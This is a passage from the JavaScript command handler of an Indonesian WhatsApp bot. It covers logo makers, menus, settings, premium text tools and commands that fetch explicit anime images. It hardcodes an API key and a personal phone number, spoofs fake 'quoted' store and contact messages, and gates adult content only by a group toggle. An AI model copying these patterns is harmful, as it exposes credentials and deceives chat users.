  setReply(`${update}`)
  
		    
     let wou = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `Done`},"type": "RESPONSE"}]
     //await sendButLocation(from, update, copyright, fotonya, wou, {contextInfo: forward})
     } catch(err){
     	setReply(err)
     }
break 
case 'gfx1':
case 'gfx2':
case 'gfx5':
if (args.length ==0) return reply(`Text Nya Mana? Contohnya\n${prefix+command} ikyc`)
reply(mess.wait)
ini_txt = args.join(" ")
gfx = await getBuffer(`https://hardianto.xyz/api/bot/${command}?apikey=hardianto&nama=${ini_txt}`)
ikyc.sendMessage(from, gfx, image, { quoted: iky, caption: '*Logo By ikyc Officia*'})
break
case 'gfx3':
case 'gfx4':
if (args.length ==0) return reply(`Text Nya Mana? Contohnya\n${prefix+command} ikyc OFC`)
reply(mess.wait)
ini_txt1 = args[0]
ini_txt1 = args[1]
gfx = await getBuffer(`https://hardianto.xyz/api/bot/${command}?apikey=hardianto&text1=${ini_txt1}&text2=${ini_txt1}`)
ikyc.sendMessage(from, gfx, image, { quoted: iky, caption: '*Logo By ikyc Officia*'})
break
           case 'guralogo':
           if (isBanned) return reply (mess.banned)
                if (args.length == 0) return reply(`Example: ${prefix + command} IKYZ`)
                    woy = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://hardianto.xyz/api/bot/gfx5?apikey=hardianto&text=${woy}`)
                    ikyc.sendMessage(from, buffer, image, { quoted: iky, caption: mess.success})
                    break
case 'kanekilogo':
   if (isBanned) return reply (mess.banned)
                if (args.length == 0) return reply(`Example: ${prefix + command} IKYZ`)
                    woy = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://hardianto.xyz/api/bot/gfx1?apikey=hardianto&nama=${woy}`)
                    ikyc.sendMessage(from, buffer, image, { quoted: iky, caption: mess.success})
                    break
case 'waifulogo':
             if (isBanned) return reply(mess.banned)
					var gh = body.slice(11)
					var gli = gh.split("|")[0];
					var tch = gh.split("|")[1];
					if (args.length < 1) return reply(`Example: ${prefix + command}Bot&Indo`)
					reply(mess.wait)
					buffer = await getBuffer(`https://hardianto.xyz/api/bot/gfx4?apikey=hardianto&text1=${gli}&text2=${tch}`)
					ikyc.sendMessage(from, buffer, image, {quoted: iky, caption: mess.success})
					break
             case 'sadlogo':
             if (isBanned) return reply(mess.banned)
					var gh = body.slice(9)
					var gli = gh.split("|")[0];
					var tch = gh.split("|")[1];
					if (args.length < 1) return reply(`Example: ${prefix + command}Iky|Zad`)
					reply(mess.wait)
					buffer = await getBuffer(`https://hardianto.xyz/api/bot/gfx3?apikey=hardianto&text1=${gli}&text2=${tch}`)
					ikyc.sendMessage(from, buffer, image, {quoted: fhidetag, caption: mess.success})
					break
case 'lolilogo':
              if (isBanned) return reply (mess.banned)
                if (args.length == 0) return reply(`Example: ${prefix + command} IkyZyx`)
                    woy = args.join(" ")
                    reply(mess.wait)
                    buffer = await getBuffer(`https://hardianto.xyz/api/bot/gfx2?apikey=hardianto&nama=${woy}`)
                    ikyc.sendMessage(from, buffer, image, { quoted: iky, caption: mess.success})
                    break
	case 'cerpen':
	RA.RandomCerpen().then(respon => {
     teks =`*Author:* ${respon.author}\n*Judul:* ${respon.data.judul}\n*Kategori:* ${respon.data.kategori}\n\n${respon.data.cerita}`
   setReply(teks)
})
	break	
case "ceweindo":
        sendButMessage(from, `Random Indo Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Indo`,
            },
            type: 1,
          },
        ]);
        break	
case "cewejepang":
        sendButMessage(from, `Random Jepang Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Jepang`,
            },
            type: 1,
          },
        ]);
        break	
case "cewearab":
        sendButMessage(from, `Random Arab Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Arab`,
            },
            type: 1,
          },
        ]);
        break	
case "cewekorea":
        sendButMessage(from, `Random Korea Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Korea`,
            },
            type: 1,
          },
        ]);
        break	
case "cewemalaysia":
        sendButMessage(from, `Random Malaysia Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Malay`,
            },
            type: 1,
          },
        ]);
        break	
case "cewerussia":
        sendButMessage(from, `Random Russia Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Rusia`,
            },
            type: 1,
          },
        ]);
        break	        
case "ceweamerika":
        sendButMessage(from, `Random Amerika Cecan`, `press the button below`, [
          {
            buttonId: `/gimage ${command}`,
            buttonText: {
              displayText: `Cecan Amerika`,
            },
            type: 1,
          },
        ]);
        break 
         case '18+cek':
                    if ((isMedia && !iky.message.videoMessage || isQuotedImage) && args.length == 0) {
                        var encmedia = isQuotedImage ? JSON.parse(JSON.stringify(iky).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : iky
                        var filePath = await ikyc.downloadAndSaveMediaMessage(encmedia, filename = getRandom());
                        var form = new FormData();
                        var stats = fs.statSync(filePath);
                        var fileSizeInBytes = stats.size;
                        var fileStream = fs.createReadStream(filePath);
                        form.append('img', fileStream, { knownLength: fileSizeInBytes });
                        var options = {
                            method: 'POST',
                            credentials: 'include',
                            body: form
                        }
                        get_result = await fetchJson(`https://api.lolhuman.xyz/api/nsfwcheck?apikey=${apikey}`, {...options })
                        fs.unlinkSync(filePath)
                        get_result = get_result.result
                        is_nsfw = "No"
                        if (Number(get_result.replace("%", "")) >= 50) is_nsfw = "Yes"
                        reply(`18+? ${is_nsfw}\nScore Dewasa : ${get_result}`)
                    } else {
                        reply(`Kirim gambar dengan caption ${prefix + command} atau tag gambar yang sudah dikirim`)
                    }
                    break                             	               	
case 'nsfwmenu':   
ikyo = hentong.ahah(prefix, pushname)
let woker = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `ɪɴғᴏ ʙᴏᴛᴢ`},"type": "RESPONSE"},
                       {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `sᴇᴡᴀ ʙᴏᴛᴢ`},"type": "RESPONSE"}]
if(katalog) {
costum(`*Loading...*`)
sendKatalog(hentong.ahah(prefix, pushname))
} else if(troli) {
sendTroli(hentong.ahah(prefix, pushname))
} else if(Lokasi){
costum(`*Loading...*`)
sendButLocation(from, ikyo, `© ${fake1}`, fs.readFileSync('./stik/allmenu.jpg'), woker, {contextInfo: forward})
} else  if(dokumen) {
costum(`*Loading...*`)
Sendbutdocument(from, ikyo,`Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thumbnaildokumen.jpg'), woker, options)
}
break	
case 'menu':
	if (isBanned) return reply(mess.ban)
           const rows8 = [{
        "title": 'ALL MENU 📋',
        "description": `All Menu Will Open`,
        "rowId": `${prefix}menuall`
    }, {
        "title": 'OWNER 👤',
        "description": `Seeing Robot Owner`,
        "rowId": `${prefix}owner`
    }, {
        "title": 'SOUND 🎶',
        "description": `Viewing The Sound Menu`,
        "rowId": `${prefix}sound`
    }, {
        "title": 'PREMIUM 😎',
       "description": `View Premium Menu`,
        "rowId": `${prefix}menuprem`
    }, {
        "title": 'PROFILE 🪧',
        "description": `Viewing Your Profile`,
        "rowId": `${prefix}myprofile`
    }, {
        "title": 'SC 📚',
        "description": `Viewing the Source Code`,
        "rowId": `${prefix}sc`
    }, {
        "title": 'CECAN 👭',
        "description": `Seeing Cute Girl`,
        "rowId": `${prefix}cecan`
    }];
    const sections8 = [{
        title: `Hai Kak ${pushname} Pilih salah satu`,
        rows: rows8
    }];
    const listt8 = {
        buttonText: `Klik Kak ${pushname}`,
        title: `𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨 🛸`,
        description: `𝗛𝗔𝗜 𝗞𝗔𝗞 ${pushname} 𝗦𝗘𝗟𝗔𝗠𝗔𝗧 𝗦𝗘𝗠𝗢𝗚𝗔 𝗛𝗔𝗥𝗜𝗠𝗨 𝗠𝗘𝗡𝗬𝗘𝗡𝗔𝗡𝗚𝗞𝗔𝗡 💮\n\n𝗪𝗘𝗔𝗧𝗛𝗘𝗥 \n >${tampilUcapan} \n\n𝗝𝗢𝗜𝗡 𝗚𝗥𝗨𝗕 𝗞𝗔𝗠𝗜 𝗞𝗔𝗞 : https://chat.whatsapp.com/FLfuSoLcV56J1CBn6g4CFg \n\n𝗝𝗔𝗠 \n𝗪𝗜𝗧 : ${timeWit} \n𝗪𝗜𝗕 : ${timeWib} \n𝗪𝗜𝗧𝗔 : ${timeWita} \n\n𝘾𝙇𝙄𝘾𝙆 𝙃𝙀𝙍𝙀 \n>wa.me/6289699472590?text=Haii%20Imkyyy \n\n𝙈𝘼𝙐 𝘼𝘿𝘿 𝘽𝙊𝙏 𝙆𝙀 𝙂𝙍𝙐𝙋 ? 𝙆𝙀𝙏𝙄𝙆 \n>free1hari <linkgc>`,
        footerText: `Terus Ikuti Iky Bot Untuk Update Selanjutnya SekianTerimaGaji \n${Tanggals}\n\n    ❍ㅤ        ⎙ㅤ        ⌲
ᶜᵒᵐᵐᵉⁿᵗ      ˢᵃᵛᵉ       ˢʰᵃʳᵉ`,
        sections: sections8,
        listType: 1
    };
    ikyc.sendMessage(from, listt8, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
case 'instangame':
	if (isBanned) return reply(mess.ban)
           const rows9 = [{
        "title": 'Moto Racing',
        "rowId": `${prefix}game1`
    }, {
        "title": 'Bike Racing',
        "rowId": `${prefix}game2`
    }, {
        "title": 'Free Kick',
        "rowId": `${prefix}game3`
    }, {
        "title": 'Crazy Archer',
        "rowId": `${prefix}game4`
    }, {
        "title": 'Crazy Racing',
        "rowId": `${prefix}Game5`
    }, {
        "title": 'Adventure Skate',
        "rowId": `${prefix}game6`
    }, {
        "title": 'War Zone',
        "rowId": `${prefix}game7`
    }, {
        "title": 'Tactical Squad',
        "rowId": `${prefix}game8`
    }, {
        "title": 'Castle Defend',
        "rowId": `${prefix}game9`
    }, {
        "title": 'Save Girl',
        "rowId": `${prefix}game10`
    }, {
        "title": 'Bike Racing',
        "rowId": `${prefix}game11`
    }, {
        "title": 'Sonic Clash',
        "rowId": `${prefix}game12`
    }, {
        "title": 'Jack Vs Zombie',
        "rowId": `${prefix}gam13`
    }, {
        "title": 'Crowd Run',
        "rowId": `${prefix}game14`
    }, {
        "title": 'Hungry Game',
        "rowId": `${prefix}game15`
    }, {
        "title": 'Sky Racing',
        "rowId": `${prefix}game16`
    }, {
        "title": 'Cop Case',
        "rowId": `${prefix}game17`
    }, {
        "title": 'Truck',
        "rowId": `${prefix}game18`
    }, {
        "title": 'Sweet Candy',
        "rowId": `${prefix}game19`      
    }, {    
        "title": 'Monster Truck',
        "rowId": `${prefix}game20`
    }];
    const sections9 = [{
        title: `Hai Kak ${pushname} Pilih salah satu`,
        rows: rows9
    }];
    const listt9 = {
        buttonText: `Klik Kak ${pushname}`,
        title: `𝙄𝙉𝙎𝙏𝘼𝙉 𝙂𝘼𝙈𝙀 🛸`,
        description: `𝗛𝗔𝗜 𝗞𝗔𝗞 ${pushname} 𝗦𝗘𝗟𝗔𝗠𝗔𝗧 𝗦𝗘𝗠𝗢𝗚𝗔 𝗛𝗔𝗥𝗜𝗠𝗨 𝗠𝗘𝗡𝗬𝗘𝗡𝗔𝗡𝗚𝗞𝗔𝗡 💮\n\n𝗪𝗘𝗔𝗧𝗛𝗘𝗥 \n >${tampilUcapan} \n\n𝗝𝗢𝗜𝗡 𝗚𝗥𝗨𝗕 𝗞𝗔𝗠𝗜 𝗞𝗔𝗞 : https://chat.whatsapp.com/FLfuSoLcV56J1CBn6g4CFg \n\n𝗝𝗔𝗠 \n𝗪𝗜𝗧 : ${timeWit} \n𝗪𝗜𝗕 : ${timeWib} \n𝗪𝗜𝗧𝗔 : ${timeWita}`,
        footerText: `Terus Ikuti Iky Bot Untuk Update Selanjutnya SekianTerimaGaji \n${Tanggals}`,
        sections: sections9,
        listType: 1
    };
    ikyc.sendMessage(from, listt9, MessageType.listMessage, {
        contextInfo: {
            "mentionedJid": [sender]
        }
    })
break
             
case 'donasi':
if (isBanned) return reply(mess.ban)
woyl = `𝙃𝘼𝙇𝙇𝙊 ${pushname} 𝘿𝙊𝙉𝘼𝙎𝙄 𝙃𝙀𝙍𝙀
╔════════════╗
║❏ 𝙂𝙊𝙋𝘼𝙔[><]•
║❏ 083870640443
║❏ 𝙊𝙑𝙊[><]•
║❏ 083870640443
║❏ 𝙋𝙐𝙇𝙎𝘼[><]•
║❏ 083870640443
╚════════════╝
`;
        sendButImage(from, woyl, "𝙒𝘼𝙍𝙉𝙄𝙉𝙂 !!!️\n\n𝙅𝙄𝙆𝘼 𝘽𝙐𝙏𝙏𝙊𝙉 𝙏𝙄𝘿𝘼𝙆 𝙆𝙀𝙇𝙐𝘼𝙍 𝙆𝙀𝙏𝙄𝙆 /𝙈𝙀𝙉𝙐𝘼𝙇𝙇", dony, [
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: ` 𝘖𝘞𝘕𝘌𝘙`,
            },
            type: 1,
          },         
        {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: ` 𝘉𝘈𝘊𝘒`,
            },
            type: 1,
          },
        ]);
        break
case 'menuprem':
if (isBanned) return reply(mess.ban)
woyl = `𝘏𝘈𝘓𝘖 ${tampilUcapan} ${pushname} 𝘗𝘙𝘌𝘔 𝘔𝘌𝘕𝘜
╔════════════╗
║➣ caridoi
╚════════════╝
╔════════════╗
║➣ twitterhd
╚════════════╝
╔════════════╗
║➣ fbdl
╚════════════╝
╔════════════╗
║➣ twdl
╚════════════╝
╔════════════╗
║➣ pinterest
╚════════════╝
╔════════════╗
║➣ play
╚════════════╝
╔════════════╗
║➣ ytmp3
╚════════════╝
╔════════════╗
║➣ ytmp4
╚════════════╝
╔════════════╗
║➣ besarkecil
╚════════════╝
╔════════════╗
║➣ bilangangka
╚════════════╝
╔════════════╗
║➣ jumlahangka
╚════════════╝
╔════════════╗
║➣ balikhuruf
╚════════════╝
╔════════════╗
║➣ balikangka
╚════════════╝
╔════════════╗
║➣ katajago
╚════════════╝
╔════════════╗
║➣ kapital
╚════════════╝
╔════════════╗
║➣ all nsfw
╚════════════╝
╔════════════╗
║➣ hidetag
╚════════════╝
╔════════════╗
║➣ asupan
╚════════════╝
╔════════════╗
║➣ cecan
╚════════════╝
╔════════════╗
║➣ ytdl
╚════════════╝
╔════════════╗
║➣ whatanime
╚════════════╝
╔════════════╗
║➣ cekprem
╚════════════╝
╔════════════╗
║➣ mediafire
╚════════════╝
╔════════════╗
║➣ jadian
╚════════════╝
╔════════════╗
║➣ ngewe
╚════════════╝
╔════════════╗
║➣ memeindo
╚════════════╝
╔════════════╗
║➣ katailham
╚════════════╝
╔════════════╗
║➣ nuliskiri
╚════════════╝
╔════════════╗
║➣ nulidkanan
╚════════════╝
╔════════════╗
║➣ foliokiri
╚════════════╝
╔════════════╗
║➣ foliokanan
╚════════════╝
╔════════════╗
║➣ gimage
╚════════════╝
╔════════════╗
║➣ brainly
╚════════════╝
╔════════════╗
║➣ inspect
╚════════════╝
╔════════════╗
║➣ jarak
╚════════════╝
`;
        sendButImage(from, woyl, "𝙒𝘼𝙍𝙉𝙄𝙉𝙂 !!!️\n\n𝙅𝙄𝙆𝘼 𝘽𝙐𝙏𝙏𝙊𝙉 𝙏𝙄𝘿𝘼𝙆 𝙆𝙀𝙇𝙐𝘼𝙍 𝙆𝙀𝙏𝙄𝙆 /𝙈𝙀𝙉𝙐𝘼𝙇𝙇", prek, [
          {
            buttonId: `${prefix}profile`,
            buttonText: {
              displayText: ` 𝘍𝘙𝘖𝘍𝘐𝘓𝘌`,
            },
            type: 1,
          },         
        {
            buttonId: `${prefix}cekprem`,
            buttonText: {
              displayText: ` 𝘊𝘌𝘒𝘗𝘙𝘌𝘔`,
            },
            type: 1,
          },
        ]);
        break
case 'sound':	        
if (isBanned) return reply(mess.ban)
woyl = `𝙃𝘼𝙇𝙇𝙊 ${pushname} 𝙎𝙊𝙐𝙉𝘿 𝙃𝙀𝙍𝙀
╔════════════╗
║𝙎𝙊𝙐𝙉𝘿
║❏.𝙨1 𝙎/𝘿 .𝙨50
╚════════════╝
`;
        sendButVideo(from, woyl, "𝙒𝘼𝙍𝙉𝙄𝙉𝙂 !!!️\n\n𝙅𝙄𝙆𝘼 𝘽𝙐𝙏𝙏𝙊𝙉 𝙏𝙄𝘿𝘼𝙆 𝙆𝙀𝙇𝙐𝘼𝙍 𝙆𝙀𝙏𝙄𝙆 /𝙈𝙀𝙉𝙐𝘼𝙇𝙇", lolic, [
          {
            buttonId: `${prefix}owner`,
            buttonText: {
              displayText: ` 𝘖𝘞𝘕𝘌𝘙`,
            },
            type: 1,
          },         
        {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: ` 𝘉𝘈𝘊𝘒`,
            },
            type: 1,
          },
        ]);
        break

case 'menuall':
case 'help':   
try{
stod = `${sender}`
menunya = help.menu(listcmdblock, explain, kyun, process, timeWit, timeWita, timeWib, multi, fs, isPremium, getLimit, limit, limitCount, balance, getBalance, sender, blocked, ban, listerror, user, autosticker, forwarding, fake,autoread, autovn, typing, Antibuggc,Toxic, isAntihidetag, isKickarea, isAntiLink, AntiVirtex, isAntiviewonce, hitnya, pushname, ucapanWaktu, prefix, publik, week, weton, calender)
let mok = [{"buttonId": `INFO BOTZ`,"buttonText": {"displayText": `𝘐𝘕𝘎𝘗𝘖`},"type": "RESPONSE"},
                    {"buttonId": `SEWA BOTZ`,"buttonText": {"displayText": `𝘚𝘌𝘔𝘞𝘈`},"type": "RESPONSE"}]
options = {contextInfo: { forward, externalAdReply:{title: `${ucapanWaktu} kak`,previewType:"PHOTO",thumbnail: thumb, sourceUrl:"https://youtu.be/_IlvsY7S7j8"}}}  
if(katalog) {
costum(`*Loading...*`)
sendKatalog(menunya)
}  if(troli) {
sendTroli(menunya)
}else  if(dokumen) {
costum(`*Loading...*`)
Sendbutdocument(from, menunya,`Baterai : ${baterai.battery}\n© ${fake1}`,fs.readFileSync('./stik/thumbnaildokumen.jpg'), mok, options)
} else  if(Lokasi) {
costum(`*Loading...*`)
sendButLocation(from, menunya, `Baterai : ${baterai.battery}\n© ${fake1}`, fs.readFileSync('./stik/thums.jpeg'), mok, {contextInfo: forward})
}
} catch(err) {
sendMess(err)
sendTroli(menunya)
}
break
	

        case 'setmenu':
	if(!isOwner) return
	if ((args[0]) === 'katalog'|| (args[0]) === 'product' ){
		katalog = true
		Lokasi = false
		troli = false
		dokumen = false
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'lokasi' ){
		Lokasi = true
		katalog = false
		troli = false
		dokumen = false
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if ((args[0]) === 'troli' ){
		Lokasi = false
		katalog = false
		troli = true
		dokumen = false
		
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		}else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
		Lokasi = false
		katalog = false
		troli = false
		dokumen = true
		await sendButMessage(from, `Berhasil mengubah tampilan menu ke ${q}`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}profile`, buttonText: {displayText: `ᴘʀᴏғɪʟᴇ`,},type: 1},
                      {buttonId: `${prefix}menu`, buttonText: { displayText: `ᴍᴇɴᴜ`,},type: 1}]);
		} else if (!q) {
                      sendButMessage(from, `SETTING MENU`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setmenu katalog`, buttonText: {displayText: `ᴋᴀᴛᴀʟᴏɢ`},type: 1},
                      {buttonId: `${prefix}setmenu troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setmenu lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    }
	break
        
    case 'katajago':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("cantik")
		    nyz10 = await fetchJson(`${api}/random/katajago?query=${q}`)
		    nyz33 = `[ *KATA JAGO* ]\n`,
		    nyz33 += `${tz} ➺ : ${nyz10.result.list}`
		    reply(nyz33)	
		    break		     
		    case 'besarkecil':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("halo kak")
		    nyz11 = await fetchJson(`${api}/random/besarkecil?query=${q}`)
		    nyz34 = `[ *BESAR KECIL* ]\n`,
		    nyz34 += `${tz} ➺ : ${nyz11.result.list}`
		    reply(nyz34)	
		    break	   
            case 'bilangangka':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("193719174")
		    nyz21 = await fetchJson(`${api}/random/bilangangka?query=${q}`)
		    nyz44 = `[ *BILANG ANGKA* ]\n`,
		    nyz44 += `${tz} ➺ : ${nyz21.result.list}`
		    reply(nyz44)
		    break 
		    case 'jumlahangka':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("193719174")
		    nyz22 = await fetchJson(`${api}/random/jumlahangka?query=${q}`)
		    nyz45 = `[ *JUMLAH ANGKA* ]\n`,
		    nyz45 += `${tz} ➺ : ${nyz22.result.list}`
		    reply(nyz45)
		    break  
		    case 'balikhuruf':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("halo kak")
		    nyz23 = await fetchJson(`${api}/random/balikhuruf?query=${q}`)
		    nyz46 = `[ *BALIK HURUF* ]\n`,
		    nyz46 += `${tz} ➺ : ${nyz23.result.list}`
		    reply(nyz46)
		    break			     
		    case 'balikangka':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 		
		    if (args.length < 1) return random("193719174")
		    nyz25 = await fetchJson(`${api}/random/balikangka?query=${q}`)
		    nyz48 = `[ *BALIK ANGKA* ]\n`,
		    nyz48 += `${tz} ➺ : ${nyz25.result.list}`
		    reply(nyz48)
		    break 
		    case 'jumlahhuruf':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("halo kak")
		    nyz12 = await fetchJson(`${api}/random/jumlahhuruf?query=${q}`)
		    nyz35 = `[ *JUMLAH HURUF* ]\n`,
		    nyz35 += `${tz} ➺ : ${nyz12.result.list}`
		    reply(nyz35)	
		    break
		    case 'jumlahangka':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("193719174")
		    nyz13 = await fetchJson(`${api}/random/jumlahangka?query=${q}`)
		    nyz36 = `[ *JUMLAH ANGKA* ]\n`,
		    nyz36 += `${tz} ➺ : ${nyz13.result.list}`
		    reply(nyz36)
		    break  	
		    case 'kapital':
			if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
            if (isBanned) return reply("MAAF ANDA TELAH DI BANNED") 			
		    if (args.length < 1) return random("halo kak")
		    nyz15 = await fetchJson(`${api}/random/kapital?query=${q}`)
		    nyz38 = `[ *KAPITAL* ]\n`,
		    nyz38 += `${tz} ➺ : ${nyz15.result.list}`
		    reply(nyz38)
		    break



case 'setquoted':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'ftoko'|| (args[0]) === 'product' ){
		if(fakeToko) return setReply("Udah aktif")
		fakeToko = true
        fakeKontak = false
        fakeTeks = false   
        fakeTroli = false
		await ikyc.sendMessage(from,"Berhasil mengubah quoted ke ftoko", text, {quoted: ftoko})
		} else if ((args[0]) === 'fkontak' ){
		if(fakeKontak) return setReply("Udah aktif")
		fakeToko = false
        fakeKontak = true
        fakeTeks = false   
        fakeTroli = false
		await ikyc.sendMessage(from,"Berhasil mengubah quoted ke fkontak", text, {quoted: fkontak})
		} else if ((args[0]) === 'ftext'){
		if(fakeTeks) return setReply("Udah aktif")
		fakeToko = false
        fakeKontak = false
        fakeTeks = true   
        fakeTroli = false
		await ikyc.sendMessage(from,"Berhasil mengubah quoted ke ftext", text, {quoted: ftext})
		} else if ((args[0]) === 'ftroli'){
		if(fakeTeks) return setReply("Udah aktif")
		fakeToko = false
        fakeKontak = false
        fakeTeks = false   
        fakeTroli = true
		await ikyc.sendMessage(from,"Berhasil mengubah quoted ke ftroli", text, {quoted: ftroli})
		} else if (!q) {
                      sendButMessage(from, `SETTING QUOTED`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setquoted ftoko`, buttonText: {displayText: `ғᴛᴏᴋᴏ`},type: 1},
                      {buttonId: `${prefix}setquoted fkontak`, buttonText: {displayText: `ғᴋᴏɴᴛᴀᴋ`},type: 1},
                      {buttonId: `${prefix}setquoted ftext`, buttonText: { displayText: `ғᴛᴇxᴛ`},type: 1}]);
                    }
	break
case 'setreply':
if(!isOwner) return onlyOwner()
if ((args[0]) === 'web'|| (args[0]) === 'situs' ){
if(setWeb) return setReply("Udah aktif")
setWeb = true
setTroli = false
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'troli' ){
if(setTroli) return setReply("Udah aktif")
setWeb = false
setTroli = true
setMessage = false
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'mess'){
if(setMessage) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = true
setVideo = false
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if ((args[0]) === 'vidio'|| (args[0]) === 'video' ){
if(setVideo) return setReply("Udah aktif")
setWeb = false
setTroli = false
setMessage = false
setVideo = true
setReply(`Berhasil mengubah set reply ke ${q}`)
} else if (!q) {
sendButMessage(from, `SETTING REPLY`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}setreply web`, buttonText: {displayText: `ᴡᴇʙ`},type: 1},
{buttonId: `${prefix}setreply troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
{buttonId: `${prefix}setreply mess`, buttonText: { displayText: `ᴍᴇss`},type: 1}]);
 }
break
case 'setbc':
	if(!isOwner) return onlyOwner()
	if ((args[0]) === 'troli'|| (args[0]) === 'product' ){
		if(bcTroli) return setReply("Udah aktif")
		bcTroli = true
        bcLokasi = false
        bcDokumen = false   
		await ikyc.sendMessage(from,"Berhasil mengubah broadcast ke troli", text, {quoted: setQuoted})
		} else if ((args[0]) === 'lokasi' ){
		if(bcLokasi) return setReply("Udah aktif")
		bcTroli = false
        bcLokasi = true
        bcDokumen = false   
		await ikyc.sendMessage(from,"Berhasil mengubah broadcast ke lokasi", text, {quoted: setQuoted})
		} else if ((args[0]) === 'document' || (args[0]) === 'pdf' || (args[0]) === 'dokumen' || (args[0]) === 'ori'){
		if(bcDokumen) return setReply("Udah aktif")
		bcTroli = false
        bcLokasi = false
        bcDokumen = true   
		await ikyc.sendMessage(from,"Berhasil mengubah broadcast ke dokumen", text, {quoted: setQuoted})
		} else if (!q) {
                      sendButMessage(from, `SETTING BROADCAST`, `Silahkan pilih salah satu`, [
                      {buttonId: `${prefix}setbc pdf`, buttonText: {displayText: `ᴅᴏᴋᴜᴍᴇɴ`},type: 1},
                      {buttonId: `${prefix}setbc troli`, buttonText: {displayText: `ᴛʀᴏʟɪ`},type: 1},
                      {buttonId: `${prefix}setbc lokasi`, buttonText: { displayText: `ʟᴏᴋᴀsɪ`},type: 1}]);
                    }
	break	
	                case 'neko':
					case 'waifu':
					case 'trap':
					case 'blowjob':
					
					if (!isNsfw && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
					setReply(mess.wait)
					ana = await fetchJson(`https://api.waifu.pics/nsfw/${command}`)
                    sendMediaURL(from, ana.url, 'Done!')
                    limitAdd(sender, limit)
					break
					
					case 'yuri':
					case 'kiss':
					case 'cum':
					case 'futanari':
					case 'hentai':
					case 'eroyuri':
					case 'eron':
					case 'erok':
					case 'ero':
					case 'solo':
					case 'erokemo':
					case 'fox_girl':
					case 'feet':
					case 'les':
					case 'feed':
					case 'bj':
					if (!isNsfw && isGroup) return setReply("Fitur nsfw blom aktif")
					if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
